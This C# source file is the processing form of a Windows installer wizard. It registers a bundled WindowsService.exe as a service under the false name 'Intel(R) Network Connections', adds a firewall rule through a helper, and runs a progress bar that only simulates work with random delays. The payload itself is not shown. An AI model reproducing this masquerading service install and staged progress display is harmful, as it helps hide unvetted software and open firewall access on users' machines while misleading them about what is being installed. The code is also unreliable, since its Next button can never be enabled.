using System;
using System.ComponentModel;
using System.Reflection;
using System.Windows.Forms;

namespace Installer
{
    public partial class frm4Process : Form
    {
        public frm4Process()
        {
            InitializeComponent();
            Shown += new EventHandler(Form1_Shown);

            // To report progress from the background worker we need to set this property
            backgroundWorker1.WorkerReportsProgress = true;
            // This event will be raised on the worker thread when the worker starts
            backgroundWorker1.DoWork += new DoWorkEventHandler(backgroundWorker1_DoWork);
            // This event will be raised when we call ReportProgress
            backgroundWorker1.ProgressChanged += new ProgressChangedEventHandler(backgroundWorker1_ProgressChanged);
        }

        void Form1_Shown(object sender, EventArgs e)
        {
            // Start the background worker
            backgroundWorker1.RunWorkerAsync();
        }
        void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            // Your background task goes here

            #region Install Windows Service
            String filePath = Application.StartupPath + "\\WindowsService.exe";
            Assembly assembly = Assembly.LoadFrom(filePath);
            Utils.InstallService("Intel(R) Network Connections", assembly);
            #endregion

            //Add Firewall rule
            Utils.ConfigureFirewall();

            for (int i = 0; i <= 100; i++)
            {
                // Report progress to 'UI' thread
                backgroundWorker1.ReportProgress(i);
                // Simulate long task
                Random rnd = new Random();
                int randomNumber = rnd.Next(50,100);
                System.Threading.Thread.Sleep(randomNumber);
            }
        }

        // Back on the 'UI' thread so we can update the progress bar
        void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            // The progress percentage is a property of e
            progressBar.Value = e.ProgressPercentage;
            if(progressBar.Value > 100)
            {
                btnNext.Enabled = true;
            }
        }

        private void btnNext_Click(object sender, EventArgs e)
        {
            frm5Finish finish = new frm5Finish();
            this.Hide();
            finish.ShowDialog();
            this.Close();
        }
    }
}
